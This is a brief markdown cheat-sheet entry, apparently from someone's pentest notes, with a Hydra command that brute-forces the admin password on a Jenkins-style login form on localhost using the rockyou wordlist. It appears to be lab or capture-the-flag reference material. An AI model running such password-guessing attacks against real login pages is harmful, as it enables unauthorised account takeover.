---
publish: true
created: 2026-10-03T08:40:24.740Z
modified: 2026-10-03T08:40:24.740Z
---

### hydra

```bash

## HTTP-POST-FORM
# To list options
$ hydra -U http-post-form

# Example
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 16 -s 4444 localhost http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Error" -vV -f
```
